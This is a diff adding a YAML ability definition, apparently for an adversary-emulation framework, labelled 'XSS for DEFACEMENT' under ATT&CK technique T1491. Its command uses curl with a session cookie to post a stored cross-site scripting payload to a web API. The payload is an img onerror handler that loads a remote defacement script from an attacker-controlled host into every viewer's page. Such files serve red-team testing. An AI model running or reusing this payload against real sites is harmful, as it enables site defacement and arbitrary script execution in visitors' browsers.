@@ -1,0 +1,33 @@
+- tactic: impact
+  technique_name: Defacement
+  technique_id: ' T1491'
+  name: XSS for DEFACEMENT
+  description: Using curl to inject a XSS defacement script
+  executors:
+  - name: sh
+    platform: darwin
+    command: "curl -k -X POST https://192.168.2.1/api/createpost -d ''comment=<img\n\
+      \      src=x onerror=''\\''''var script=document.createElement(\"script\");\
+      \ script.src=\"https://192.168.0.10/attacker/defacement.js\";\n      document.body.appendChild(script);''\\\
+      ''''>'' -b #{cookie} -i"
+    code: null
+    language: null
+    build_target: null
+    payloads: []
+    uploads: []
+    timeout: 60
+    parsers: []
+    cleanup: []
+    variations: []
+    additional_info: {}
+  requirements: []
+  privilege: ''
+  repeatable: false
+  buckets:
+  - impact
+  additional_info: {}
+  access: {}
+  singleton: false
+  plugin: ''
+  delete_payload: true
+  id: 761324b4-5ba3-43fc-a482-8538587ba5e4
